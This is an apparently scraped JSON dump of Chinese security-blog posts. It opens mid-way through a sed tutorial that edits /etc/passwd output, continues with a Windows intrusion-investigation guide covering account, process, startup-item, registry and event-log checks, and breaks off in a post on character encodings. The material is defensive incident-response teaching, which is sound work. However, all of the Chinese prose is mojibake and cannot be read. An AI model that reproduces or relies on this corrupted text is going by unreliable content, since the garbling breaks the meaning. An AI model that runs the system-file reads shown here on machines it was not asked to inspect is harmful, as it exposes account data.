sync:x:4:65534:sync:/bin:/bin/sync....ä¸‹é¢å¿½ç•¥ å¦‚æœrootæ‰¾åˆ°ï¼Œé™¤äº†è¾“å‡ºæ‰€æœ‰è¡Œï¼Œè¿˜ä¼šè¾“å‡ºåŒ¹é…è¡Œã€‚ ä½¿ç”¨-nçš„æ—¶å€™å°†åªæ‰“å°åŒ…å«æ¨¡æ¿çš„è¡Œã€‚ nl /etc/passwd | sed -n &#x27;/root/p&#x27;1 root:x:0:0:root:/root:/bin/bash ã€æ•°æ®çš„æœå¯»å¹¶åˆ é™¤ã€‘ åˆ é™¤/etc/passwdæ‰€æœ‰åŒ…å«rootçš„è¡Œï¼Œå…¶ä»–è¡Œè¾“å‡º nl /etc/passwd | sed &#x27;/root/d&#x27;2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh3 bin:x:2:2:bin:/bin:/bin/sh....ä¸‹é¢å¿½ç•¥#ç¬¬ä¸€è¡Œçš„åŒ¹é…rootå·²ç»åˆ é™¤äº† ã€æ•°æ®çš„æœå¯»å¹¶æ‰§è¡Œå‘½ä»¤ã€‘ æœç´¢/etc/passwdï¼Œæ‰¾åˆ°rootå¯¹åº”çš„è¡Œï¼Œæ‰§è¡Œåé¢èŠ±æ‹¬å·ä¸­çš„ä¸€ç»„å‘½ä»¤ï¼Œæ¯ä¸ªå‘½ä»¤ä¹‹é—´ç”¨åˆ†å·åˆ†éš”ï¼Œè¿™é‡ŒæŠŠbashæ›¿æ¢ä¸ºblueshellï¼Œå†è¾“å‡ºè¿™è¡Œï¼š nl /etc/passwd | sed -n &#x27;/root/&#123;s/bash/blueshell/;p;q&#125;&#x27; 1 root:x:0:0:root:/root:/bin/blueshell æœ€åçš„qæ˜¯é€€å‡ºã€‚ ã€æ•°æ®çš„æœå¯»å¹¶æ›¿æ¢ã€‘ é™¤äº†æ•´è¡Œçš„å¤„ç†æ¨¡å¼ä¹‹å¤–ï¼Œ sed è¿˜å¯ä»¥ç”¨è¡Œä¸ºå•ä½è¿›è¡Œéƒ¨åˆ†æ•°æ®çš„æœå¯»å¹¶å–ä»£ã€‚åŸºæœ¬ä¸Š sed çš„æœå¯»ä¸æ›¿ä»£çš„ä¸ vi ç›¸å½“çš„ç±»ä¼¼ï¼ä»–æœ‰ç‚¹åƒè¿™æ ·ï¼š sed &#x27;s/è¦è¢«å–ä»£çš„å­—ä¸²/æ–°çš„å­—ä¸²/g&#x27; å…ˆè§‚å¯ŸåŸå§‹ä¿¡æ¯ï¼Œåˆ©ç”¨ /sbin/ifconfig æŸ¥è¯¢ IP [root@www ~]# /sbin/ifconfig eth0eth0 Link encap:Ethernet HWaddr 00:90:CC:A6:34:84inet addr:192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0inet6 addr: fe80::290:ccff:fea6:3484/64 Scope:LinkUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1.....(ä»¥ä¸‹çœç•¥)..... æœ¬æœºçš„ipæ˜¯192.168.1.100ã€‚ å°† IP å‰é¢çš„éƒ¨åˆ†äºˆä»¥åˆ é™¤ [root@www ~]# /sbin/ifconfig eth0 | grep &#x27;inet addr&#x27; | sed &#x27;s/^.*addr://g&#x27;192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0 æ¥ä¸‹æ¥åˆ™æ˜¯åˆ é™¤åç»­çš„éƒ¨åˆ†ï¼Œäº¦å³ï¼š 192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0 å°† IP åé¢çš„éƒ¨åˆ†äºˆä»¥åˆ é™¤ [root@www ~]# /sbin/ifconfig eth0 | grep &#x27;inet addr&#x27; | sed &#x27;s/^.*addr://g&#x27; | sed &#x27;s/Bcast.*$//g&#x27;192.168.1.100 ã€å¤šç‚¹ç¼–è¾‘ã€‘ ä¸€æ¡sedå‘½ä»¤ï¼Œåˆ é™¤/etc/passwdç¬¬ä¸‰è¡Œåˆ°æœ«å°¾çš„æ•°æ®ï¼Œå¹¶æŠŠbashæ›¿æ¢ä¸ºblueshell nl /etc/passwd | sed -e &#x27;3,$d&#x27; -e &#x27;s/bash/blueshell/&#x27;1 root:x:0:0:root:/root:/bin/blueshell2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh -eè¡¨ç¤ºå¤šç‚¹ç¼–è¾‘ï¼Œç¬¬ä¸€ä¸ªç¼–è¾‘å‘½ä»¤åˆ é™¤/etc/passwdç¬¬ä¸‰è¡Œåˆ°æœ«å°¾çš„æ•°æ®ï¼Œç¬¬äºŒæ¡å‘½ä»¤æœç´¢bashæ›¿æ¢ä¸ºblueshellã€‚","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"Windowså…¥ä¾µæ’æŸ¥","slug":"Windowså…¥ä¾µæ’æŸ¥","date":"2022-03-28T11:55:03.000Z","updated":"2022-03-28T15:49:48.253Z","comments":true,"path":"post/fbbd4eb4.html","link":"","permalink":"https://wolke.cn/post/fbbd4eb4.html","excerpt":"","text":"ä¸€ã€å‰è¨€1ã€ä»€ä¹ˆæ˜¯åº”æ€¥å“åº”â€œåº”æ€¥å“åº”â€å¯¹åº”çš„è‹±æ–‡æ˜¯â€œIncident Responseâ€æˆ–â€œEmergency Responseâ€ç­‰ï¼Œé€šå¸¸æ˜¯æŒ‡ä¸€ä¸ªç»„ç»‡ä¸ºäº†åº”å¯¹å„ç§æ„å¤–äº‹ä»¶çš„å‘ç”Ÿæ‰€åšçš„å‡†å¤‡ä»¥åŠåœ¨äº‹ä»¶å‘ç”Ÿåæ‰€é‡‡å–çš„æªæ–½ã€‚ï¼ˆç™¾åº¦ï¼‰ 2ã€å¸¸è§æ”»å‡»ç±»å‹ï¼ˆ1ï¼‰WEBå…¥ä¾µï¼šæŒ‚é©¬ï¼Œç½‘é¡µç¯¡æ”¹ï¼Œæ¤å…¥webshellï¼Œé»‘é¡µï¼Œæš—é“¾ç­‰ ï¼ˆ2ï¼‰ä¸»æœºå…¥ä¾µï¼šç—…æ¯’æœ¨é©¬ï¼Œå‹’ç´¢ç—…æ¯’ï¼Œè¿œæ§åé—¨ï¼Œç³»ç»Ÿå¼‚å¸¸ï¼ŒRDPçˆ†ç ´ï¼ŒSSHçˆ†ç ´ï¼Œä¸»æœºæ¼æ´ï¼Œæ•°æ®åº“å…¥ä¾µç­‰ ï¼ˆ3ï¼‰ç½‘ç»œæ”»å‡»ï¼šDDOS/CCæ”»å‡»ï¼ŒARPæ”»å‡»ï¼ŒDNS/HTTPåŠ«æŒ ï¼ˆ4ï¼‰è·¯ç”±å™¨/äº¤æ¢æœºæ”»å‡»ï¼šå†…ç½‘ç—…æ¯’ï¼Œé…ç½®é”™è¯¯ï¼Œæœºå™¨æœ¬èº«çš„æ¼æ´ç­‰ äºŒã€Windowså…¥ä¾µæ’æŸ¥æ€è·¯1ã€æ£€æŸ¥ç³»ç»Ÿè´¦å·å®‰å…¨ï¼ˆ1ï¼‰æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦æœ‰å¼±å£ä»¤ï¼Œè¿œç¨‹ç®¡ç†ç«¯å£æ˜¯å¦å¯¹å…¬ç½‘å¼€æ”¾ &emsp;&emsp;æ®å®é™…æƒ…å†µå’¨è¯¢ç›¸å…³æœåŠ¡å™¨ç®¡ç†å‘˜ã€‚ ï¼ˆ2ï¼‰æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨å¯ç–‘è´¦å·ã€æ–°å¢è´¦å·ã€‚ é»‘å®¢è·å¾—shellåï¼Œé€šå¸¸ä¼šæ–°å»ºä¸€ä¸ªç”¨æˆ·ç”¨æ¥ç™»é™†è¿œç¨‹æ¡Œé¢ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥net useræŸ¥çœ‹å½“å‰è®¡ç®—æœºç­‰ç­‰ç”¨æˆ·æœ‰æ— å¢åŠ  åœ¨è¿è¡Œä¸­è¾“å…¥mmcæ‰“å¼€æ§åˆ¶å°ï¼Œé€‰æ‹©æ–‡ä»¶-&gt;æ·»åŠ /åˆ é™¤ç®¡ç†å•å…ƒ-&gt;æœ¬åœ°ç”¨æˆ·å’Œç»„ã€‚ï¼ˆä¹Ÿå¯ä»¥åœ¨cmd çª—å£ï¼Œè¾“å…¥ lusrmgr.msc å‘½ä»¤ï¼‰ ï¼ˆ3ï¼‰æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å­˜åœ¨éšè—è´¦å·ã€å…‹éš†è´¦å·ã€‚ æ‰“å¼€æ³¨å†Œè¡¨ ï¼ŒæŸ¥çœ‹ç®¡ç†å‘˜å¯¹åº”é”®å€¼ã€‚ ä½¿ç”¨Dç›¾_webæŸ¥æ€å·¥å…·ï¼Œé›†æˆäº†å¯¹å…‹éš†è´¦å·æ£€æµ‹çš„åŠŸèƒ½ã€‚ ï¼ˆ4ï¼‰ç»“åˆæ—¥å¿—ï¼ŒæŸ¥çœ‹ç®¡ç†å‘˜ç™»å½•æ—¶é—´ã€ç”¨æˆ·åæ˜¯å¦å­˜åœ¨å¼‚å¸¸ã€‚ Win+R æ‰“å¼€è¿è¡Œï¼Œè¾“å…¥â€eventvwr.mscâ€œï¼Œå›è½¦è¿è¡Œï¼Œæ‰“å¼€â€œäº‹ä»¶æŸ¥çœ‹å™¨â€ã€‚ å¯¼å‡º Windows æ—¥å¿— â€“ å®‰å…¨ï¼Œåˆ©ç”¨å¾®è½¯å®˜æ–¹å·¥å…· Log Parser è¿›è¡Œåˆ†æ 2ã€æ£€æŸ¥ç½‘ç»œçŠ¶æ€ã€è¿›ç¨‹ï¼ˆ1ï¼‰æ£€æŸ¥ç«¯å£è¿æ¥æƒ…å†µï¼Œæ˜¯å¦æœ‰è¿œç¨‹è¿æ¥ã€å¯ç–‘è¿æ¥ã€‚ ä½¿ç”¨netstat -anoå‘½ä»¤æŸ¥çœ‹ç›®å‰çš„ç½‘ç»œè¿æ¥ï¼Œå®šä½å¯ç–‘çš„ ESTABLISHED æ ¹æ® netstat å‘½ä»¤å®šä½å‡ºçš„ PID ç¼–å·ï¼Œå†é€šè¿‡ tasklist å‘½ä»¤è¿›è¡Œè¿›ç¨‹å®šä½ tasklist | findstr &quot;PID&quot; ï¼ˆ2ï¼‰æŸ¥çœ‹hostsæ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹ï¼Œhostsæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ä¸ºC:\\Windows\\System32\\drivers\\etc ï¼ˆ3ï¼‰è¿›ç¨‹ å¼€å§‹ â€“ è¿è¡Œ â€“ è¾“å…¥ msinfo32 å‘½ä»¤ï¼Œä¾æ¬¡ç‚¹å‡» â€œè½¯ä»¶ç¯å¢ƒ â€“ æ­£åœ¨è¿è¡Œä»»åŠ¡â€ å°±å¯ä»¥æŸ¥çœ‹åˆ°è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚è¿›ç¨‹è·¯å¾„ã€è¿›ç¨‹IDã€æ–‡ä»¶åˆ›å»ºæ—¥æœŸä»¥åŠå¯åŠ¨æ—¶é—´ç­‰ã€‚ æ‰“å¼€Dç›¾_webæŸ¥æ€å·¥å…·ï¼Œè¿›ç¨‹æŸ¥çœ‹ï¼Œå…³æ³¨æ²¡æœ‰ç­¾åä¿¡æ¯çš„è¿›ç¨‹ã€‚ é€šè¿‡å¾®è½¯å®˜æ–¹æä¾›çš„ Process Explorer ç­‰å·¥å…·è¿›è¡Œæ’æŸ¥ ã€‚ æŸ¥çœ‹å¯ç–‘çš„è¿›ç¨‹åŠå…¶å­è¿›ç¨‹ã€‚å¯ä»¥é€šè¿‡è§‚å¯Ÿä»¥ä¸‹å†…å®¹ï¼š æ²¡æœ‰ç­¾åéªŒè¯ä¿¡æ¯çš„è¿›ç¨‹æ²¡æœ‰æè¿°ä¿¡æ¯çš„è¿›ç¨‹è¿›ç¨‹çš„å±ä¸»è¿›ç¨‹çš„è·¯å¾„æ˜¯å¦åˆæ³•CPU æˆ–å†…å­˜èµ„æºå ç”¨é•¿æ—¶é—´è¿‡é«˜çš„è¿›ç¨‹ å°æŠ€å·§ æŸ¥çœ‹ç«¯å£å¯¹åº”çš„ PIDï¼šnetstat -ano | findstr &quot;port&quot; æŸ¥çœ‹è¿›ç¨‹å¯¹åº”çš„ PIDï¼šä»»åŠ¡ç®¡ç†å™¨ â€“ æŸ¥çœ‹ â€“ é€‰æ‹©åˆ— â€“ PID æˆ–è€… tasklist | findstr &quot;PID&quot; æŸ¥çœ‹è¿›ç¨‹å¯¹åº”çš„ç¨‹åºä½ç½®ï¼šä»»åŠ¡ç®¡ç†å™¨ â€“ é€‰æ‹©å¯¹åº”è¿›ç¨‹ â€“ å³é”®æ‰“å¼€æ–‡ä»¶ä½ç½®ï¼›æˆ–è€…è¿è¡Œè¾“å…¥ wmicï¼Œcmd ç•Œé¢è¾“å…¥ process tasklist /svc è¿›ç¨‹ â€“ PID â€“ æœåŠ¡ æŸ¥çœ‹WindowsæœåŠ¡æ‰€å¯¹åº”çš„ç«¯å£ï¼š%systemroot%/system32/drivers/etc/servicesï¼ˆä¸€èˆ¬ %systemroot% å°±æ˜¯ C:\\Windows è·¯å¾„ï¼‰ 3ã€æ£€æŸ¥å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€æœåŠ¡ï¼ˆ1ï¼‰æ£€æŸ¥å¯åŠ¨é¡¹ ç™»å½•æœåŠ¡å™¨ï¼Œå•å‡»ã€å¼€å§‹ã€‘&gt;ã€æ‰€æœ‰ç¨‹åºã€‘&gt;ã€å¯åŠ¨ã€‘ï¼Œé»˜è®¤æƒ…å†µä¸‹æ­¤ç›®å½•åœ¨æ˜¯ä¸€ä¸ªç©ºç›®å½•ï¼Œç¡®è®¤æ˜¯å¦æœ‰éä¸šåŠ¡ç¨‹åºåœ¨è¯¥ç›®å½•ä¸‹ã€‚ å•å‡»å¼€å§‹èœå• &gt;ã€è¿è¡Œã€‘ï¼Œè¾“å…¥ msconfigï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œæ˜¯åˆ™å–æ¶ˆå‹¾é€‰å‘½åå¼‚å¸¸çš„å¯åŠ¨é¡¹ç›®ï¼Œå¹¶åˆ°å‘½ä»¤ä¸­æ˜¾ç¤ºçš„è·¯å¾„åˆ é™¤æ–‡ä»¶ã€‚Windows7ä¸Šå¯ä»¥ç›´æ¥åœ¨è¿™é‡Œçœ‹åˆ°å¼€æœºçš„å¯åŠ¨é¡¹ï¼Œè€Œç°åœ¨Windows10éœ€è¦åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­æŸ¥çœ‹ å•å‡»ã€å¼€å§‹ã€‘&gt;ã€è¿è¡Œã€‘ï¼Œè¾“å…¥ regeditï¼Œæ‰“å¼€æ³¨å†Œè¡¨ï¼ŒæŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹æ˜¯å¦æ­£å¸¸ï¼Œç‰¹åˆ«æ³¨æ„å¦‚ä¸‹ä¸‰ä¸ªæ³¨å†Œè¡¨é¡¹ã€‚ æ£€æŸ¥å³ä¾§æ˜¯å¦æœ‰å¯åŠ¨å¼‚å¸¸çš„é¡¹ç›®ï¼Œå¦‚æœ‰è¯·åˆ é™¤ï¼Œå¹¶å»ºè®®å®‰è£…æ€æ¯’è½¯ä»¶è¿›è¡Œç—…æ¯’æŸ¥æ€ï¼Œæ¸…é™¤æ®‹ç•™ç—…æ¯’æˆ–æœ¨é©¬ã€‚ HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\runHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce åˆ©ç”¨å®‰å…¨è½¯ä»¶æŸ¥çœ‹å¯åŠ¨é¡¹ã€å¼€æœºæ—¶é—´ç®¡ç†ç­‰ã€‚ ç»„ç­–ç•¥ï¼Œè¿è¡Œ gpedit.msc ï¼ˆ2ï¼‰æ£€æŸ¥è®¡åˆ’ä»»åŠ¡ å•å‡»ã€å¼€å§‹ã€‘&gt;ã€è®¾ç½®ã€‘&gt;ã€æ§åˆ¶é¢æ¿ã€‘&gt;ã€ä»»åŠ¡è®¡åˆ’ã€‘ï¼ŒæŸ¥çœ‹è®¡åˆ’ä»»åŠ¡å±æ€§ï¼Œä¾¿å¯ä»¥å‘ç°æœ¨é©¬æ–‡ä»¶çš„è·¯å¾„ã€‚ å•å‡»ã€å¼€å§‹ã€‘&gt;ã€è¿è¡Œã€‘ï¼›è¾“å…¥ cmdï¼Œç„¶åè¾“å…¥ atï¼Œæ£€æŸ¥è®¡ç®—æœºä¸ç½‘ç»œä¸Šçš„å…¶å®ƒè®¡ç®—æœºä¹‹é—´çš„ä¼šè¯æˆ–è®¡åˆ’ä»»åŠ¡ï¼Œå¦‚æœ‰ï¼Œåˆ™ç¡®è®¤æ˜¯å¦ä¸ºæ­£å¸¸è¿æ¥ã€‚ ï¼ˆ3ï¼‰æ£€æŸ¥æœåŠ¡å•å‡»ã€å¼€å§‹ã€‘&gt;ã€è¿è¡Œã€‘ï¼Œè¾“å…¥ services.mscï¼Œæ³¨æ„æœåŠ¡çŠ¶æ€å’Œå¯åŠ¨ç±»å‹ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸æœåŠ¡ã€‚é€šå¸¸ç—…æ¯’éƒ½ä¼šè—ç€è¿™é‡Œï¼Œå¹¶ä¼ªè£…åå­— 4ã€æŸ¥æ‰¾å¯ç–‘ç›®å½•åŠæ–‡ä»¶ æŸ¥çœ‹ç”¨æˆ·ç›®å½•ï¼Œæ–°å»ºè´¦å·ä¼šåœ¨è¿™ä¸ªç›®å½•ç”Ÿæˆä¸€ä¸ªç”¨æˆ·ç›®å½•ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ–°å»ºç”¨æˆ·ç›®å½•ã€‚ Window 2003ç‰ˆæœ¬ C:\\Documents and SettingsWindow 2008R2åŠä»¥åç‰ˆæœ¬ C:\\Users\\ ä¸€èˆ¬å¸¦æœ‰tmp/tempçš„éƒ½æ˜¯å­˜æ”¾ä¸´æ—¶æ–‡ä»¶çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯ä¸€èˆ¬ç—…æ¯’å­˜åœ¨çš„åœ°æ–¹ã€‚åœ¨è¿è¡Œè¾“å…¥%temp%æŸ¥çœ‹ä¸´æ—¶æ–‡ä»¶ï¼Œè¾“å…¥ %UserProfile%\\RecentæŸ¥çœ‹æœ€è¿‘æ‰“å¼€çš„æ–‡ä»¶ åœ¨æœåŠ¡å™¨å„ä¸ªç›®å½•ï¼Œå¯æ ¹æ®æ–‡ä»¶å¤¹å†…æ–‡ä»¶åˆ—è¡¨æ—¶é—´è¿›è¡Œæ’åºï¼ŒæŸ¥æ‰¾å¯ç–‘æ–‡ä»¶ã€‚ å›æ”¶ç«™ã€æµè§ˆå™¨ä¸‹è½½ç›®å½•ã€æµè§ˆå™¨å†å²è®°å½• ä¿®æ”¹æ—¶é—´åœ¨åˆ›å»ºæ—¶é—´ä¹‹å‰çš„ä¸ºå¯ç–‘æ–‡ä»¶ 5ã€æ¼æ´ä¸ç³»ç»Ÿè¡¥ä¸æœ‰çš„é»‘å®¢å…¥ä¾µåä¼šæ•…æ„å¸è½½ä¸€äº›æ¼æ´ä¸ç³»ç»Ÿè¡¥ä¸ï¼Œæ¥è¾¾åˆ°åˆ©ç”¨æ¼æ´æ¥è¿›è¡ŒæŒç»­æ§åˆ¶çš„ç›®çš„ã€‚åœ¨cmdä¸­è¾“å…¥systeminfoå³å¯æŸ¥çœ‹è®¡ç®—æœºå®‰è£…çš„è¡¥ä¸ 6ã€å‘ç°å¹¶å¾—åˆ° WebShellã€è¿œæ§æœ¨é©¬çš„åˆ›å»ºæ—¶é—´ï¼Œå¦‚ä½•æ‰¾å‡ºåŒä¸€æ—¶é—´èŒƒå›´å†…åˆ›å»ºçš„æ–‡ä»¶ï¼Ÿ åˆ©ç”¨ Registry Workshop æ³¨å†Œè¡¨ç¼–è¾‘å™¨çš„æœç´¢åŠŸèƒ½ï¼Œå¯ä»¥æ‰¾åˆ°æœ€åå†™å…¥æ—¶é—´åŒºé—´çš„æ–‡ä»¶ã€‚ åˆ©ç”¨è®¡ç®—æœºè‡ªå¸¦æ–‡ä»¶æœç´¢åŠŸèƒ½ï¼ŒæŒ‡å®šä¿®æ”¹æ—¶é—´è¿›è¡Œæœç´¢ã€‚ 7ã€æ—¥å¿—åˆ†ææ—¥å¿—ä¼šè®°å½•è®¡ç®—æœºçš„æ‰€æœ‰è¡Œä¸ºï¼Œæ‰€ä»¥é»‘å®¢çš„è¡Œä¸ºä¼šè¢«è®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æŸ¥æ—¥å¿—æ¥æŸ¥çœ‹è‡ªå·±çš„è®¡ç®—æœºæ˜¯å¦æ­£å¸¸ã€‚ ï¼ˆ1ï¼‰ç³»ç»Ÿæ—¥å¿— å‰æï¼šå¼€å¯å®¡æ ¸ç­–ç•¥ï¼Œè‹¥æ—¥åç³»ç»Ÿå‡ºç°æ•…éšœã€å®‰å…¨äº‹æ•…åˆ™å¯ä»¥æŸ¥çœ‹ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶ï¼Œæ’é™¤æ•…éšœï¼Œè¿½æŸ¥å…¥ä¾µè€…çš„ä¿¡æ¯ç­‰ã€‚ æ‰“å¼€è¿è¡Œè¾“å…¥eventvwr.mscå³å¯æŸ¥çœ‹æ—¥å¿—ã€‚é€šè¿‡æŸ¥çœ‹äº‹ä»¶idæ¥æ’æŸ¥ç›¸å…³çš„æ“ä½œè¡Œä¸º 1102 æ¸…ç†å®¡è®¡æ—¥å¿—4624 è´¦å·æˆåŠŸç™»å½•4625 è´¦å·ç™»å½•å¤±è´¥4672 æˆäºˆç‰¹æ®Šæƒé™4720 åˆ›å»ºç”¨æˆ·4726 åˆ é™¤ç”¨æˆ·4728 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„å…¨å±€ç»„ä¸­4729 å°†æˆå‘˜ä»å®‰å…¨çš„å…¨å±€ç»„ä¸­ç§»é™¤4732 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„æœ¬åœ°ç»„ä¸­4733 å°†æˆå‘˜ä»å¯ç”¨å®‰å…¨çš„æœ¬åœ°ç»„ä¸­ç§»é™¤4756 å°†æˆå‘˜æ·»åŠ åˆ°å¯ç”¨å®‰å…¨çš„é€šç”¨ç»„ä¸­4757 å°†æˆå‘˜ä»å¯ç”¨å®‰å…¨çš„é€šç”¨ç»„ä¸­ç§»é™¤4719 ç³»ç»Ÿå®¡è®¡ç­–ç•¥ä¿®æ”¹4768 Kerberosèº«ä»½éªŒè¯ï¼ˆTGTè¯·æ±‚ï¼‰4769 KerberosæœåŠ¡ç¥¨è¯è¯·æ±‚4776 NTLMèº«ä»½éªŒè¯ æ—¥å¿—æ˜¯å¯ä»¥æ¸…é™¤çš„ï¼Œä½†æ¸…é™¤æ—¥å¿—è¿™ä¸€è¡Œä¸ºåŒæ ·ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œæ‰€ä»¥æ£€æŸ¥æ—¥å¿—å°±å¯ä»¥ç¡®è®¤ä½ çš„è®¡ç®—æœºåœ¨ä¸€æ®µæ—¶é—´å†…æ˜¯å¦æ­£å¸¸ã€‚æœ€å¥½å°±æ˜¯å¤‡ä»½æ—¥å¿— å¯¼å‡ºåº”ç”¨ç¨‹åºæ—¥å¿—ã€å®‰å…¨æ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ï¼Œåˆ©ç”¨ Log Parser è¿›è¡Œåˆ†æã€‚ ï¼ˆ2ï¼‰Webè®¿é—®æ—¥å¿— æ‰¾åˆ°ä¸­é—´ä»¶çš„webæ—¥å¿—ï¼Œæ‰“åŒ…åˆ°æœ¬åœ°æ–¹ä¾¿è¿›è¡Œåˆ†æã€‚ æ¨èå·¥å…·ï¼šWindows ä¸‹ï¼Œæ¨èç”¨ EmEditor è¿›è¡Œæ—¥å¿—åˆ†æï¼Œæ”¯æŒå¤§æ–‡æœ¬ï¼Œæœç´¢æ•ˆç‡è¿˜ä¸é”™ã€‚Linux ä¸‹ï¼Œä½¿ç”¨ Shell å‘½ä»¤ç»„åˆæŸ¥è¯¢åˆ†æã€‚ ä¸‰ã€å·¥å…·ç¯‡1ã€ç—…æ¯’åˆ†æ PCHunterï¼šhttp://www.xuetr.com ç«ç»’å‰‘ï¼šhttps://www.huorong.cn Process Explorerï¼šhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhackerï¼šhttps://processhacker.sourceforge.io/downloads.php autorunsï¼šhttps://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTLï¼šhttps://www.bleepingcomputer.com/download/otl/ SysInspectorï¼šhttp://download.eset.com.cn/download/detail/?product=sysinspector 2ã€ç—…æ¯’æŸ¥æ€ å¡å·´æ–¯åŸºï¼šhttp://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe ï¼ˆæ¨èç†ç”±ï¼šç»¿è‰²ç‰ˆã€æœ€æ–°ç—…æ¯’åº“ï¼‰ å¤§èœ˜è››ï¼šhttp://free.drweb.ru/download+cureit+freeï¼ˆæ¨èç†ç”±ï¼šæ‰«æå¿«ã€ä¸€æ¬¡ä¸‹è½½åªèƒ½ç”¨1å‘¨ï¼Œæ›´æ–°ç—…æ¯’åº“ï¼‰ ç«ç»’å®‰å…¨è½¯ä»¶ï¼šhttps://www.huorong.cn 360æ€æ¯’ï¼šhttp://sd.360.cn/download_center.html 3ã€ç—…æ¯’åŠ¨æ€ CVERC-å›½å®¶è®¡ç®—æœºç—…æ¯’åº”æ€¥å¤„ç†ä¸­å¿ƒï¼šhttp://www.cverc.org.cn å¾®æ­¥åœ¨çº¿å¨èƒæƒ…æŠ¥ç¤¾åŒºï¼šhttps://x.threatbook.cn ç«ç»’å®‰å…¨è®ºå›ï¼šhttp://bbs.huorong.cn/forum-59-1.html çˆ±æ¯’éœ¸ç¤¾åŒºï¼šhttp://bbs.duba.net è…¾è®¯ç”µè„‘ç®¡å®¶ï¼šhttp://bbs.guanjia.qq.com/forum-2-1.html 4ã€åœ¨çº¿ç—…æ¯’æ‰«æç½‘ç«™ Virustotalï¼šhttps://www.virustotal.com Virscanï¼šhttp://www.virscan.org è…¾è®¯å“ˆå‹ƒåˆ†æç³»ç»Ÿï¼šhttps://habo.qq.com Jotti æ¶æ„è½¯ä»¶æ‰«æç³»ç»Ÿï¼šhttps://virusscan.jotti.org 5ã€webshellæŸ¥æ€ Dç›¾_WebæŸ¥æ€ï¼šhttp://www.d99net.net/index.asp æ²³é©¬ WebShell æŸ¥æ€ï¼šhttp://www.shellpub.com","categories":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"åº”æ€¥å“åº”","slug":"åº”æ€¥å“åº”","permalink":"https://wolke.cn/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"author":"w01ke"},{"title":"æµ…æå­—ç¬¦ç¼–ç --Unicodeä¸UTF","slug":"æµ…æå­—ç¬¦ç¼–ç -Unicodeä¸UTF","date":"2022-03-27T18:32:44.000Z","updated":"2022-03-27T18:52:42.986Z","comments":true,"path":"post/b9fef7af.html","link":"","permalink":"https://wolke.cn/post/b9fef7af.html","excerpt":"","text":"ä¸€ã€åŸå§‹çš„ASCIIç¼–ç ä»¥ä¸‹æ˜¯åŸå§‹çš„ASCIIç¼–ç å¯¹åº”å…³ç³»å›¾è¡¨ å¯ä»¥æ¥ä¸€ä¸ªå°å®éªŒï¼šæ‰“å¼€è®°äº‹æœ¬ï¼Œç¼–è¾‘ABï¼Œå¦å­˜ä¸ºæ ¼å¼ä¸ºANSIçš„ASCII.txtæ–‡ä»¶ ä½¿ç”¨UEæŸ¥çœ‹åå…­è¿›åˆ¶ï¼Œå°±ä¼šå‘ç°çš„ç¡®æ˜¯ABå¯¹åº”çš„åå…­è¿›åˆ¶æ•°41 42ï¼Œå…¶ä¸­å·¦ä¾§çš„00000000hæ˜¯è¿™ä¸¤ä¸ªå­—ç¬¦çš„ç›¸å¯¹åç§» äºŒã€ASCIIçš„æ‹“å±•ï¼šGB2312æˆ–GB2312-801ä¸ªå­—èŠ‚ï¼Œæœ€å¤šä¹Ÿå°±èƒ½è¡¨ç¤º[0ï¼Œ255]æ€»å…±256ä¸ªå­—ç¬¦ï¼Œè€Œåƒæ±‰å­—ï¼Œæ—¥æ–‡ï¼ŒéŸ©æ–‡ç­‰ç­‰ï¼Œè¿™äº›åœ¨ASCIIç è¡¨ä¸­éƒ½æ²¡æœ‰è¡¨ç¤ºæ–¹æ³•æ‰€ä»¥å°±å¿…é¡»è¦åˆ›å»ºæ–°çš„ç¼–ç  äºæ˜¯GB2312å’ŒGB2312-80è¯ç”Ÿäº†ï¼Œæ€è·¯å°±æ˜¯ï¼šæ—¢ç„¶ASCIIç 